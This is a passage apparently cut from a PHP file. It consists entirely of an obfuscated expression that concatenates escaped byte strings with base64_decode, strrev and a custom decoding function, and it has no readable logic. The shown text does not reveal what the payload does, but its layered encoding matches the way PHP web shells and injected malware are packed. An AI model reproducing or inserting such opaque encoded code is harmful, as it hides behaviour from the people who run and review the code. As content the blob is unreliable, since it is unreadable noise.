70\352\367\27\274\322\224\373\376\224\267\277\271\267\352\325\133\26\35\172\360\175\311\344\276\273\56\133\63\177\217\333\203\306"."\x94\xcd\xa7\xef\x7e\xc5\xbe\x9b\x9f\x7e\xb5\xfd\xae\x68\xcd\x85\xc3\xd1\xf7\xc2\xe7\xee\x77\x66\x60\xe3\xee\x75\xd1\x7b\x8e\x9a\xf3\xef\x37\xef\x3a\xe9\xfc\xcb\xbe\x39\xe7\xc6\xaf\x7f\xd8\x3b\xbc\x67\xef\xe9\x5f\x87\xce\x57\x9e"._kodDe('Md4qw8loUmsM4L6MkucJluFj1GSrRtRoEGFKAOaT19ikJDz8WFKnjkfWZ2oO2tzcHkh85bym1Afsxw==')."\xfb\xcd\x93\xdf\xfb\xfa\xd4\x83\x4e\xad\x59\xd0\xf7\xa7\x7d\xee\x9e\x38\xf2\xf2\xe7\x1f\x56\x6e\x99\xe3\xbc\x7d\xe3\xec\xc7\x4e\xaf\xda\xef\x89\x59\x97\x96\x6a\x7f\xfa\xdd\x97\x2f\x8d\xac\xaa\xbf\xf0\xdc\x7f\x1d\xe1\xfa\x53\xfd"."\x11\x7b\xbd\xa8\x6f\xf8\x4b\xfe\x89\x6d\x4f\xa5\x37\xee\xfd\xe2\xf4\xb6\x7b\xff\xf8\xf8\xd4\xd7\x3b\x23\x33\x3f\xf8\x7a\xc3\x61\xe7\x5e\xbf\xbd\x65\x79\xac\x79\xf3\x51\xdf\x9b\x1d\xc7\x9f\xb0\x97\xf9\xdb\x73\xf7\xf\xbc\xb0\xa8"."\170\353\365\7\355\371\156\60\266\275\263\373\345\127\356\137\161\362\257\206\227\316\76\242\76\377\310\153\357\35\265\366\350\173\357\276\154\265\71\261\373\277\127\75\360\346\233\131\163\313\235\325\357\17\136\275\333"."\x1d\xcb\x37\x9e\xb1\xf8\x94\x96\x5f\x3c\x39\xf4\xa7\xce\xfe\xdb\x16\x2d\xba\xef\x57\x3b\xbc\xf2\xe1\x4e\xd\xd7\x45\x7a\x7c\xca\x67\x7f\x7c\x6c\xf4\x8b\x33\xae\x3d\x68\x9f\x93\x66\x7e\x98\xfd\x78\x60\xcf\x33\x22\xd5\xaf\x3c\xfa"."\xed\xbb\xd9\x93\xbf\xb8\x7c\xc5\x2d\x7\xd4\xbf\xb7\x5f\xfc\x9c\x93\x2e\x5f\xe1\xea\xbf\xbe\xe5\xaf\x53\x76\xbc\x70\x5e\xd3\x3f\x9a\xbb\xde\xda\xe7\xe0\xe3\x77\xab\xb\x7b\x3b\x77\xbd\x75\x85\x73\xa0\x58\x73\xd7\x9f\xab\x7e\x7a"."\356\332\205\375\33\367\176\241\155\352\307\221\13\156\71\360\67\257\35\373\363\147\347\176\377\362\314\65\367\53\313\107\316\72\373\216\313\206\156\336\132\167\223\43\233\73\142\171\346\234\326\237\155\77\174\311\136".base64_decode('m/a8pevbJzouv/6SKQfe+6+2tbvvYtZ/VXP3qvM/uv3wnX/xXebjHV6f05qXj+o16zdfvtuSp39/')."\110\356\226\277\177\164\332\221\153\357\234\322\22\375\340\137\341\367\324\357\176\173\322\364\131\245\235\276\137\177\305\117\307\216\350\232\363\334\246\150\363\143\103\373\245\157\331\147\343\376\117\137\170\357\107\227\277"."\164\154\323\343\67\174\126\165\324\247\175\207\345\237\336\347\167\207\357\276\375\351\316\33\146\136\371\100\325\231\315\157\232\247\356\166\320\75\207\155\74\100\377\327\311\177\370\340\261\127\36\277\167\333\31\127\232"."\373\316\54\5\172\366\117\354\36\74\167\231\343\236\165\353\117\277\351\27\67\375\345\376\75\2\341\203\337\373\331\137\23\305\15\313\153\236\74\164\344\345\307\236\31\374\362\204\370\314\113\32\256\112\216\77\170"."\324\277\136\235\175\336\151\17\334\320\164\174\346\376\153\153\347\336\77\367\244\145\201\233\77\72\153\267\175\2\107\354\272\344\230\77\377\302\70\147\313\357\16\212\135\330\330\164\377\313\347\235\265\361\16\207\36"."\137\366\101\376\373\103\257\171\350\262\115\47\336\376\300\127\341\153\226\35\331\165\330\247\227\275\322\175\360\374\326\135\117\230\273\333\107\237\207\316\334\276\256\143\355\272\51\167\314\77\162\377\275\216\271\366\255"."\xc5\x6f\x9f\x38\xb0\x3d\x72\x4e\x67\xf1\xf3\xcb\x9f\xc\xf4\xec\xbe\xe8\x92\x5b\x3d\xa1\xdc\xac\xdd\xae\xba\x61\xf5\x9f\xe\xf9\xf4\xfa\xb7\xc7\x7f\xb2\xc7\xe\xcb\xce\x69\xbd\xfa\xaa\x3f\x96\x5e\xf8\x7a\xa9\xa7\x6d\xc3\x85\xc9".base64_decode('v940MmXjda/fcs51F/zu4l12Ovus1bt/89RhJ+1z8nk7PPNScsmry76On7Zw19Nnn5Pa/7qlLw5v').strrev('îzßÕi¿¿/}ësşßûìÒÃ™Ç½¥üq_)Éı™÷Ü®ç75*mgSÙÿ¿K»vCÉæ»ïƒâğy')."\x7b\xe7\x93\xbd\x2e\xf9\xe4\xa6\x53\x4e\xde\x78\xcd\x6f\x86\xdf\x38\xa6\x7a\x8f\xf3\xb6\x1c\xf8\xfc\xf6\x6b\x43\x8f\x6d\x4f\xee\xf8\x80\xe3\x4e\xcf\xf\x83\xf7\x17\x5e\x79\xe7\xaa\x39\xeb\xd7\x8e\xf5\x64\x3e\xee\x4b\x1e\xdb\xed"."\xca\xac\x3e\x6c\x64\xcb\xef\x72\x5f\x7f\xbb\xe3\x23\xd5\x7\xff\xfe\xa5\xdf\x79\x27\x7c\xb5\xb7\x4c\x5f\xf7\xf7\x9b\x5f\xbc\x7b\xfd\x75\xcf\xfe\xe2\xda\xf3\x2e\xbb\xfd\xb9\xbb\x4f\xbf\x20\x7c\xfa\xbc\xf4\x5b\x8f\xfd\xea\xbe\xdb"."\327\317\153\373\131\342\252\310\253\275\17\37\264\352\262\25\167\34\173\346\300\43\15\117\206\256\252\332\176\377\331\371\356\137\315\332\366\332\357\176\376\304\123\362\243\17\245\336\170\352\200\277\375\145\174\135\352"."\x87\x79\x17\x4f\xdb\xfe\xcf\xb3\xd5\x6d\xf\xdc\xb8\xfc\xb5\x58\xdd\x59\x87\x75\x94\xee\x3f\x45\xdf\xb6\xfe\xe5\x57\x1e\xdf\xf8\xfc\x79\x7f\xfb\x7d\xed\xfa\x4d\xae\x8b\x9e\x3f\xa3\xef\xd0\xf4\xa5\x9e\x1b\xf4\x43\x6e\x4e\xbe\xb7"."\333\227\363\337\173\150\327\217\167\16\37\260\307\153\75\371\307\167\33\72\376\230\137\115\273\272\356\211\246\31\207\67\256\176\360\265\341\147\147\374\355\173\351\206\272\43\67\157\234\361\213\173\232\16\77\362\271"."\357\276\134\362\300\73\237\256\335\165\67\375\360\227\316\233\267\373\332\243\237\337\377\276\373\136\236\63\47\63\272\343\352\221\57\7\117\176\151\363\232\346\336\317\266\37\364\307\277\377\71\371\326\123\125\73\136"."\372\320\227\137\177\371\377\116\135\376\306\315\15\347\34\263\170\372\236\335\267\336\361\207\102\317\315\7\26\357\132\261\323\232\177\57\272\362\300\15\47\157\173\353\57\75\167\34\166\344\235\357\235\373\367\317\212".base64_decode('dT+/9sPe507tqLrlriXJ3Q9c/O2tb65e/dUNtxy45/rPP37ujVsvGozOOrbh1bqV1yy9+eOPWl6L')."\57\17\337\174\335\137\246\5\156\160\167\235\162\324\317\116\77\170\305\277\77\176\375\311\243\116\70\176\373\307\267\15\334\166\365\212\357\277\371\150\366\213\261\350\103\307\177\367\351\253\237\270\137\214\175\377\376"."\277\327\36\174\360\325\337\157\371\174\313\257\237\177\347\207\270\172\304\56\137\355\273\340\253\357\216\252\373\363\123\301\205\63\317\131\71\260\337\227\147\5\357\275\151\325\355\127\171\216\271\160\335\225\153\153\236"."\x3f\x6d\x64\xde\xc9\x7b\x9f\xbc\xf2\xfe\xdb\x7f\x1d\xba\x6b\xf9\x4d\xfe\x2d\xd9\xb9\xc7\x76\x6c\xd8\x65\xd4\xf8\xf0\xd0\x4d\xbb\xdc\xb6\xcf\x5f\xa7\x27\xf\xd9\xc1\xb3\xf7\x31\x37\x3f\xfa\xd6\x3e\xe7\x1e\x93\xfe\xe0\xce\xd0\xc0"."\xf3\x3e\xff\x1f\x6f\xdb\xeb\xea\xf8\xd1\xc5\xc3\x37\x3f\x76\xd1\x87\xbf\x5d\xb2\xdf\x3d\xd3\xdf\x3c\x74\x5e\xc3\xba\xb4\xab\x70\xf1\xba\xcf\x5f\xbf\xfe\xd2\x93\xa4\x33\xd7\xdc\xfb\xcb\x8b\xe\xd2\x17\x1c\x79\xd4\x99\x2f\x1c\x72"."\xc9\x4b\x27\x3f\x74\xfb\xb6\x5d\x4f\xdd\x3c\x3a\xf0\xf2\x8c\x73\x37\xbf\xb3\x6c\xd9\xaa\x7\x4b\xab\xfa\x37\xec\x3c\x6f\xf3\x99\xeb\x1f\x7b\xff\xa2\xbb\x5e\x7d\xe8\xed\x5b\x3d\xbf\xde\x30\x7c\x63\x7a\xd9\xd0\xc3\x7f\x7b\x7e\xb7"."\105\143\376\75\23\3\37\54\135\367\306\133\372\343\57\272\137\15\275\60\275\372\374\247\307\136\150\337\147\335\235\361\125\373\73\216\51\236\261\137\374\233\337\77\243\355\163\350\45\107\37\53\105\366\77\276\347"."\xa6\xbd\xc6\x4e\xbe\xe3\xb2\xb3\x12\x53\x1f\xbb\x2c\xbc\xb4\xb0\xd3\xc0\xaf\x7e\x7b\xfd\xce\x67\xcc\xaf\xef\x59\xf4\xf3\x9e\x89\x2e\x6f\xc0\xf8\xcd\xf4\x13\xe6\xed\xb0\xc7\xbc\x27\x8b\xa7\xf7\x55\x1d\x7e\xca\xfe\x5e\x7d\xe6\xac"."\xbb\xf\x5c\x32\x2b\xd1\x7a\xec\xbe\xbb\xde\xb8\x5e\xdd\xf4\xd1\xf5\x2f\xbf\xf0\xc5\xbc\xd2\xb5\xf3\xdd\x1b\x7f\xf8\xfe\xdc\x43\x77\xf7\x8c\xbd\xa0\x7\x5f\xfc\xcc\x7f\xe8\x2b\x17\xdd\xf2\xcb\x16\xed\xf5\xb\x2e\x8\x6b\x17\x5f".base64_decode('stvbCy+75c/fdf7rLxdvGow9fceTD3kKr8y//MDZqx44c+WzS465S77ntflv/PJB5ydLr/3q022v')."\375\355\131\163\326\107\332\75\247\155\172\363\317\53\227\215\255\11\235\177\345\333\127\175\136\212\335\370\335\324\152\347\5\227\375\272\373\233\115\33\16\170\367\304\245\17\334\167\367\375\41\55\367\344\355\117\74"."\163\361\343\233\117\117\107\226\274\336\175\362\237\176\165\300\111\117\56\277\342\350\147\246\316\163\235\176\340\252\361\235\113\75\173\236\366\304\205\165\172\365\133\233\177\133\175\274\324\374\315\357\46\236\331\172\274"."\271\166\373\136\273\35\174\300\104\352\375\3\256\72\372\313\245\263\206\256\161\24\252\332\357\377\366\205\27\357\335\241\367\247\127\37\360\227\265\37\236\74\336\237\71\342\233\237\172\177\337\131\327\220\310\334\136".base64_decode('/dnRI7+Z+9L2S+8MvP72g2s+8Ezf1PzBrFD1VXEj1XL2wkjV2Q1PJ79wzXFce/cVNdU3PnrV4m2P').base64_decode('79f72Gvv/OH6JZf/v73faH1p4JDH/3rvS1dsatLf6/riCi0yf/8r9zntBOPzXYZePGX6hQ/lGn5/')."\xfd\x3e\xfa\x79\x33\xbf\xea\x59\xf0\xf4\x4e\x7f\xbb\xfe\x1f\x47\xc9\xe1\xb3\xe7\x8e\x78\xbf\x3e\x2e\xf1\xf1\xb9\x3b\xee\xf1\x62\xae\x6a\x49\xf8\xd1\x8f\xae\xbd\xf6\x0\xef\xa2\x75\xcb\xaf\xbc\xf9\x9f\x27\x3d\x35\xdc\xbf\xfe\xad"."\120\335\317\136\275\376\355\27\276\170\364\356\73\347\134\273\375\64\117\241\273\267\167\126\327\336\323\356\71\353\214\324\366\344\350\75\43\163\66\336\120\254\272\147\325\340\376\3\263\266\266\114\75\370\202\353\156"."\x29\xbd\xf3\xfa\xe6\xf4\x9e\xb\xb3\xbb\xbc\x13\x57\xd3\xb7\xdd\xd5\x7f\xdb\xad\x1b\x5a\x8f\xff\x69\x4f\xcb\x8e\xb7\xfe\x66\x97\x1b\xd6\x3f\x7b\xc1\xe\xab\xfe\x39\xfd\xf\xdf\x3e\x7c\xe0\x6b\x53\xc2\x57\x3f\xef\xea\xbd\x68\xe2".base64_decode('6O6Rrad2H//9no/WPvbZeT9cKP+k5pKD33/40lP/Ia3dOnXjns99sW/9LdfFo4WFO5hbfjKx8ui2')."\333\166\172\344\325\261\323\376\320\177\146\317\276\303\237\214\74\161\175\366\256\263\126\354\61\242\276\322\223\135\337\127\365\355\145\27\75\350\135\275\133\203\147\223\373\352\37\276\173\357\365\113\16\176\344\273\277"."\x7e\x7c\x66\xec\xff\x9d\xf0\xf5\xab\xdf\x9c\x70\xbc\xf1\xfd\x4b\x4f\x5f\x72\x54\xeb\x3\x5f\x3f\xbe\xe0\x91\xf1\x7f\x3c\xfb\xcd\x1d\xee\xf6\xbc\xbe\xfd\x8b\x6f\xb6\x3c\xf2\xf0\xcf\x7e\x58\xf3\xdd\x8d\xcf\xf\xb8\xdd\xb\xbe\x79"."\367\337\257\75\62\357\207\257\37\177\376\266\357\113\333\277\271\361\207\357\276\112\137\171\353\16\376\215\67\37\336\366\326\327\357\266\76\365\217\157\177\163\352\357\214\153\375\157\337\153\274\237\133\327\274\352\11"."\xe5\xcf\x87\x69\x8f\xcc\xf8\xeb\xdd\xef\xbd\xf0\xa7\x3f\x65\xef\x7e\x63\xf0\xcd\x79\x57\xbd\xfd\xd0\xa7\xdf\x7b\xfe\xfe\xd9\x4d\xb\xe\x39\xf2\xea\xb7\x1e\xf8\xe1\xdd\xa3\x43\x91\xbd\x3e\x99\xfa\xf8\xfc\x23\x6\xef\xee\x78\xeb"."\xf4\x6d\x2f\xbf\x9b\x6d\xb9\xc2\x7d\xfd\xea\x6b\x96\xd6\xe\xdc\x72\xd7\xb7\xdf\x5e\x75\xd4\x49\xaf\x49\x9f\xf6\x3d\x70\xcd\x27\x4f\xa5\x36\x55\xfd\xfc\x87\x2d\xf5\xc7\xff\xbd\xf1\xf3\x5f\x1e\xbf\xba\x73\xeb\xd\x73\x8f\x7c\xf0"."\x84\x97\xaf\xfd\x26\xf3\x97\xcd\xaf\xac\xbc\x66\x85\x6b\xe7\xa7\xf\xbd\xe3\x8a\x85\x4b\xce\x38\xea\xcc\xf3\x36\xfe\xe6\x8e\xb\x2f\xf9\xdb\xbd\x8b\x7e\xfb\xfb\xd7\xf7\xdf\xfd\xa7\x97\xaf\xbb\x7b\xfd\xa5\x8f\x3d\xb3\xe6\xd5\x2b"."\316\234\162\105\351\260\331\357\236\160\352\115\341\354\157\17\242\72\332\315\115\104\15\200\250\43\250\272\231\121\106\23\70\122\312\147\323\43\124\202\236\65\173\66\16\64\316\45\131\146\317\45\220\46\272\161\131".base64_decode('WUylyWaiMGak0okJkpdcFBUn8qZMT3gNZSI9OkL2rHMbSKFzZ5GaNMwm2hozZ83FgYlSYlSXSfkN').strrev('V$,“4~tr\'˜©DñÊèùviÔ˜r¹”åUÁı=n}¹œÚRlælÔ™§2€ä,\\6:'."\r".'').base64_decode('Wb6ojyujRAmIYM+ZTbpgFi01VxhJKwmDQJvIx+fMJHjNs0g1RvOKOjJBO6F5FukavbRyNE1ukoYz')."\305\154\311\240\167\375\31\103\127\350\35\155\336\130\231\225\343\44\163\262\70\52\217\244\111\45\15\263\60\42\47\351\26\147\145\126\121\113\243\164\300\111\25\32\351\170\26\265\174\266\224\241\127\125\161\55\231"."\316\221\310\270\42\247\164\223\234\17\315\151\44\12\304\272\154\306\107\46\110\323\342\143\43\352\304\50\251\102\323\34\62\316\215\63\111\267\233\143\152\262\240\254\244\135\117\222\123\351\302\312\222\114\232\147\346"."\62\331\211\161\162\103\331\104\151\13\14\311\330\170\66\117\267\161\132\66\116\257\367\322\251\102\262\230\41\204\325\324\100\132\243\257\34\117\146\12\11\372\41\112\72\215\15\264\325\244\147\307\62\343\245\121\172"."\120\115\7\53\256\217\27\322\324\200\0\354\4\365\221\141\122\271\261\42\370\156\236\354\46\33\150\345\364\374\104\326\240\107\76\263\111\267\304\307\307\64\203\156\265\147\315\151\246\43\116\76\74\173\46\251\123"."\143\63\351\205\261\221\144\174\45\325\5\155\242\363\120\57\216\244\65\205\14\126\102\316\227\46\12\244\266\315\315\15\264\321\244\167\233\146\65\323\355\271\72\222\322\311\100\151\71\260\100\144\310\21\361\170\76"."\143\16\33\364\116\145\134\63\331\51\375\354\271\163\150\25\347\320\341\43\144\52\217\153\243\211\22\351\342\6\72\356\315\215\344\263\232\152\352\251\74\151\176\62\221\67\324\141\312\43\30\171\67\321\235\170\61".base64_decode('MTFO+q+ZzujZjbNok+bQypAMc2k3jRQTeW2c3hLmAE8qkTFppl2qmBMFg2rjltKanswRjb4xZbwg')."\27\111\146\165\124\237\110\344\350\261\334\160\142\104\313\222\343\237\71\224\52\346\320\256\325\127\46\106\307\124\102\316\112\12\64\224\152\306\224\324\234\74\74\236\240\243\105\246\157\63\255\267\256\52\162\266\100"."\357\331\225\144\74\141\220\341\230\115\231\337\310\170\141\70\271\222\174\172\274\124\110\146\125\302\105\232\50\275\246\342\331\304\112\131\241\34\216\114\120\332\111\224\171\314\245\44\67\132\110\245\263\53\311\70\215".base64_decode('JVPmRF6lKZmJbJrUdhblfZmikQSTl+Ab6fx4kRDashzprHY5MUyPsQ1TNouGDYGq9SdEtc9hRaG6').base64_decode('i1Q7kl9CG0Wki0zT+QEGPPkRLqthNCziJvKmkAxillSoTQjPWXiMXgiETU1n1/dYy8YFa+iyNqi+')."\xc1\x82\x91\x8c\x5b\xd2\x19\x94\x9e\xce\xd8\x53\x52\x76\x78\x1c\x75\x1d\xd3\x61\x80\xff\x91\x86\x61\x33\x15\x43\x19\x29\x2a\x4c\xbf\x19\x63\xbb\x68\x7f\xc5\x85\x7e\xc7\x27\xf4\xa6\x6c\xc\xbb\x44\xb0\x53\x4c\x55\xf3\xe0\xd3\xd9"."\254\313\152\276\4\155\131\350\60\305\270\122\52\157\41\277\101\25\140\274\217\205\256\260\16\232\240\243\126\240\313\12\200\46\15\213\131\25\241\317\334\70\214\12\141\133\213\135\274\146\325\60\130\123\251\307\205"."\x5a\x91\xb6\xba\x61\x5b\xdd\xa8\x40\xa1\x9d\x62\x1a\xae\x5\x4f\xb4\x8d\xa1\xd8\xa4\x34\x3b\xd1\xe6\xc7\xab\xa4\x82\xbc\x76\xe4\xf6\xa2\xac\x23\xd1\xd0\x5b\xa9\xd3\x42\x14\x56\xba\x26\xe7\x9c\xc8\xf0\xc8\x21\xe1\xf\x3a\x24\x74".base64_decode('nyhZzVD8XoldvIojL1ZSVwpZOcEqWBiXUjLImmyRUmAySFQJWjI1GharJl5s2hpjmVz25lgSQY8X')."\x99\x69\x7\xbb\x55\x11\xf\x60\xd1\xfd\x2e\xaf\x33\x8e\xb2\x5b\x9b\x30\x28\x89\xdd\x4b\xeb\x4a\x52\x25\x65\xe5\x94\x1c\xc2\xa4\x5a\xaf\xe8\x56\x86\x69\x0\x26\xb2\x8a\xac\x5b\x6e\x84\xe6\x2f\x28\x64\xa\xd0\xb2\xd0\x9c\xb7\x80".base64_decode('WBaRq66Y8F0S5urVIjRrv2Wi88nlbRdMACGakAMrFs2DPKeVQ3GomIfhUDEPU4keu1vI7+Koo0TF').strrev('æ¯>'."\0".'ekzedd›¦yé`ôØ¦¬‘ıÎ£³	½âH`‡š?¢3)I·`&h	u“°¨?mcÖ*E/')."\25\66\16\105\203\235\275\103\55\277\130\42\253\121\6\4\306\54\226\124\111\142\300\337\36\363\372\211\51\235\247\317\37\13\207\203\202\261\132\213\300\33\240\252\74\277\302\204\61\256\62\17\17\361\305\353\115".strrev('º$Ğ1)ô“XØ™F'."\n".'¡<G	Õ5+g¾ Æ‚ã«½WLã¢˜„öèëa€Ş˜‰aJ‚D_%!=KÃ').base64_decode('gwNSRzDQ39MbxlaIGN4bFNKROpslWQSTYn19AU+HT/L3RoJUT5Wp6yIN5TCL06brhsKMMEl+HBG1')."\250\305\22\131\111\204\20\7\35\63\242\125\321\332\150\165\264\346\70\127\324\30\42\363\345\70\161\104\10\347\356\363\222\26\265\260\20\143\367\75\341\360\261\104\71\77\30\362\164\4\150\55\332\75\141\22\14".base64_decode('dvhxYNuFGz+4/5xtV2zYcvrZoKCtl5+09ZK7P7j37A/XPrRlw1nbHj5n64W3bT3rRFL1D2+754OH')."\x1e\xd9\x76\xe1\x4d\x5b\x36\x5c\xba\xf5\xe2\xfb\xb6\x5d\x7e\x32\x4e\xf8\xe8\xe6\x8d\x5b\xce\xb8\x89\x55\x4c\xfa\xe8\x82\x87\xb7\x9e\xb3\x7e\xeb\x45\xb7\x6f\x3d\x7b\xc3\x96\xfb\x2f\xd8\xf2\xe0\x49\x5b\xee\xbd\xd7\x1\x72\x7f\x74"."\312\331\333\36\332\260\165\335\305\133\257\373\305\326\273\316\334\172\345\331\133\316\270\146\313\145\67\155\73\347\266\55\327\256\335\162\352\331\37\336\166\321\321\166\332\301\361\101\72\12\344\216\332\275\42\152\324"."\126\343\236\215\32\165\260\127\153\300\157\65\324\170\5\277\124\321\17\120\134\30\332\251\364\166\370\354\32\344\142\224\30\257\326\142\242\200\64\315\4\2\203\30\277\322\170\14\131\23\314\230\264\26\253\311\320"."\13\225\22\52\343\365\205\73\102\376\166\37\321\251\144\3\65\35\351\366\221\253\157\0\15\207\226\260\60\263\257\50\63\71\226\252\251\311\161\215\144\151\210\354\112\150\331\142\56\217\52\53\125\101\125\222\52".base64_decode('B+SeSFSQqiD3BwAlAWZbNbQVREprM5bNcNQ7GmokYo+McxD7Y6mK2B6zfJaPOOKWWIOjvkaqKgxX')."\x91\x7a\xf1\x7e\x5\xb5\x8f\x61\x4c\x43\x92\x1d\xd5\xa4\xc2\x62\x75\x39\x2e\xe0\x79\x86\xa9\xcb\x6a\xde\x34\xa4\x84\x83\x81\x58\x7e\xf0\x6b\xb1\x29\x4e\xb8\x78\xe\x3c\x4e\x0\xc3\xe\x93\x3c\xbd\x5e\x2b\x26\x36\x45\xee\x9b\x21"."\311\371\44\110\301\375\53\16\363\214\32\51\116\264\126\53\44\242\154\226\316\150\265\164\106\165\35\141\21\175\135\154\274\261\242\251\204\255\24\160\265\144\203\16\24\201\242\241\202\120\74\132\24\127\3\315\0"."\203\203\361\101\200\245\14\53\343\274\44\300\211\130\2\35\101\10\147\203\130\41\15\331\210\127\141\121\5\267\63\147\244\51\227\43\146\301\75\313\130\33\50\55\223\41\120\270\205\71\264\267\360\105\72\272\61"."\225\207\5\62\117\306\247\133\10\225\167\247\144\41\221\54\65\337\43\170\170\272\100\206\260\7\302\363\367\166\6\103\75\330\316\40\334\321\355\353\361\270\10\377\306\224\200\361\241\214\40\265\112\63\40\347\303".base64_decode('oBmW7kcfol0WQV8F8ypmKoaJe6GQJpUhoy8hCzIZZWmdgW0qqYk4dYgQDEVioAMIexa47gxhoRAV')."\x37\x8b\xba\x5e\x62\xdb\x2c\x2c\x24\x73\x31\x44\xae\xe3\x32\x8c\x92\x24\xcc\x31\x25\x27\xc0\x2e\x8a\x1a\x1a\xc7\xe9\xe1\x8\xa8\x2\xfc\x72\x47\xb0\xb7\xd3\x4f\xd\x2f\xbc\x71\x4b\x9a\x37\xe4\x87\xd6\x7e\xa4\x72\x12\x2d\x21\xc6".base64_decode('7+JBpDCaZGFuJgcT2LIPInzVhymCkwf4mXAvC3NBDUSguhznwANeFu5mxlIwIRgSIp6QpyfMoqEB')."\300\321\41\114\260\15\352\361\204\43\240\125\275\375\75\234\353\7\74\113\0\301\4\271\134\102\71\166\265\253\166\101\115\24\133\76\340\40\376\131\110\143\120\173\174\150\125\203\103\232\265\246\206\340\120\133\201".base64_decode('mJlR81RYhF85NhALBLtwHDmf8OWTXJaWBiUga0a4rGnQ5YvNCAnQsYTNqaTe4ICHezIQEjCESLMS').base64_decode('92/gXjEYHY26gMhgHMcNGrztEhVGOqA7AaJpT3J76IpKlw4HCcSyWppaCAMWSQUI/LuUBhD3JBnA')."\xe\xac\x90\xa5\x6\xe\xd8\xb2\x22\x16\x5d\x1d\x3d\x26\xea\x74\x61\x63\x12\x28\xc9\x44\x1d\xbc\x66\x31\xdf\x52\xb0\xea\x86\xc3\x16\x4b\x98\x18\xb2\xa5\x27\xa5\x83\x36\x93\x10\x9e\xc7\x38\x32\x9f\xfc\x90\x7d\xc4\x7c\xd2\x13\x24".base64_decode('2tbKhtZ37Ope8NcVWe0DfwHwE4iAwVMZApikAf9i32r4D0+okUQEf+9q8C9gMav9vfbM7b7IgM+H')."\21\150\230\374\162\124\300\162\110\323\4\327\44\213\202\324\360\111\12\370\72\43\22\214\323\317\306\142\325\250\363\234\103\165\65\261\230\333\350\47\324\302\54\106\253\147\114\153\230\101\126\21\117\270\203\363\137"."\13\35\224\223\0\122\36\266\216\77\163\265\101\342\135\241\140\177\237\20\357\366\54\361\367\166\321\230\273\226\206\152\251\55\276\327\37\6\135\324\101\151\220\173\0\21\343\104\344\104\202\221\50\362\132\10\332"."\13\170\73\210\10\202\70\334\1\140\336\154\235\143\355\375\376\200\127\64\366\203\210\144\111\101\174\235\254\52\323\151\345\150\34\231\375\321\10\354\162\32\106\344\105\43\250\17\150\4\167\0\215\241\356\242\21"."\344\151\204\106\120\103\151\4\156\111\174\275\64\15\354\353\300\236\214\156\326\322\134\367\64\43\227\230\21\313\274\144\134\60\114\265\35\34\241\103\21\37\34\67\262\110\40\5\56\111\260\221\203\47\120\302\71"."\x86\x1b\x63\x0\x69\x13\xe1\x80\xdf\xe8\x71\xb\x90\x34\x7c\x1c\x25\x4b\x6c\x97\x65\x46\x54\x93\xd9\xd9\xa1\x8f\x12\xb7\x18\xe0\xa3\x7e\x64\x16\x23\x7c\x96\xac\xe7\xfc\xe0\xc3\xba\xe7\x61\xbc\xe3\x38\xb6\x95\x21\xee\x4c\x1c\xe4"."\127\347\225\265\252\332\101\10\31\301\275\360\117\224\340\106\311\66\206\230\256\314\160\320\5\66\306\355\37\115\275\50\350\165\62\235\113\244\152\126\214\303\24\261\357\320\71\14\350\117\152\162\204\226\166\122\117"."\123\223\70\226\125\125\224\332\72\142\217\46\166\75\60\21\314\125\311\370\221\47\125\207\66\251\276\27\311\320\57\230\33\311\111\156\150\43\63\43\41\63\303\315\251\104\57\42\336\166\374\233\203\152\322\141\45"."\x4b\x8e\xd3\xbd\x71\xa4\x3e\xc7\x15\xb2\x59\x77\x18\x82\x5a\x1d\x3a\xff\xe1\xed\xc3\x2e\x5b\x6c\x19\x49\x49\x7e\x56\x65\x1\x8b\x3\x3\xdc\x5f\x88\xaa\x75\x64\xc1\xca\xca\x8d\x8e\xe1\xe1\xc\xff\xc8\x84\x4a\xf\x5c\x59\x95\xf2"."\132\237\242\347\124\164\304\64\300\225\160\131\272\302\207\15\151\72\263\363\154\164\326\227\267\172\56\51\346\301\27\372\330\210\70\33\50\62\165\75\205\210\100\142\142\16\323\54\5\103\201\362\12\172\212\310\177"."\xa\x29\x56\xcf\x62\x4a\x39\xda\x56\x39\x53\xd3\x7a\xe4\xfc\x78\x44\x5b\xa2\xd2\x3b\x20\x6f\x70\xa0\x37\x10\xa4\x4e\xf\xa8\x87\x14\x32\xef\xc9\xd9\x3f\xd8\x50\xe8\x2e\x1a\x31\x69\xa0\x72\x93\x74\x99\xd4\x67\x80\xae\x16\x88\x70"."\271\223\256\243\105\272\100\3\314\51\314\23\352\350\6\342\135\254\323\17\144\137\337\122\42\102\55\16\172\143\341\140\177\210\236\106\300\70\262\132\10\371\72\226\261\323\1\6\355\364\54\261\103\140\161\21\117"."\127\105\60\23\356\40\34\361\321\130\50\10\45\141\137\240\323\226\41\334\315\374\113\130\141\261\200\277\167\161\305\204\110\60\326\43\144\301\100\260\37\356\261\303\254\45\204\175\260\53\170\274\75\20\354\20\222"."\xfd\xc1\xf2\x9e\x0\xcc\xdb\x6\xc4\xa2\x32\x5d\x60\xab\xa3\xab\x10\x37\x6d\x1\x4c\x35\xb9\x1a\x2e\xb7\xce\x18\x58\xad\x17\x44\xd7\xd4\x54\x47\xdd\xb\x5c\xb5\x4c\x46\xc4\x43\x23\xe8\xe8\x57\x6\xab\x46\xc4\xc2\xc4\xdc\x2e\x17"."\51\200\5\200\204\312\154\177\51\15\22\7\76\141\154\61\151\371\2\131\341\327\10\156\57\240\31\210\313\356\46\303\217\317\371\142\341\145\141\326\223\130\127\277\122\272\205\166\60\232\170\230\154\103\6\177\175".strrev('	è§aÌ†fø’‘]œ\\€³æşòmšDÄÎ…­T«âFÙ¢@Œ({Æª\\‚ ÅbÏˆZ"*ÉDj"')."\366\272\310\212\223\161\333\324\43\0\356\251\113\230\240\34\330\110\157\265\226\71\163\316\144\64\322\5\275\112\104\227\263\12\252\272\340\335\41\241\345\223\310\223\5\141\15\162\202\136\325\24\301\126\220\36\4"."\xc3\x5\xc9\x70\x8e\xaa\xb4\xb\xa6\x31\xab\x50\x72\xa3\x12\x93\x91\x4d\x73\x4c\xbc\xc\x1b\x71\x1a\x6a\x3a\xef\x94\xb3\x69\xd\xf0\xe0\x4c\x8e\x42\xe5\x61\x4b\x3a\x77\x9\x52\xd0\xc0\x46\x97\xfa\xd8\x73\x82\x4f\x8\x69\x18\x19".base64_decode('FE7XGnjszDypwIjBYiLlwD5l9wdhVLsWqZk4FuoEa5ygnh0smn7oMYbbREGOiHzpkHVc4o7IqPBb')."\231\211\303\235\256\240\157\116\171\101\156\230\137\44\345\206\331\51\71\135\342\351\312\133\122\72\205\373\46\276\5\46\76\302\100\132\373\70\275\302\41\332\341\355\343\120\177\275\154\245\203\246\113\242\343\64\317"."\x40\xb8\xd9\xd9\xdd\xe3\xe9\x70\x2\x8e\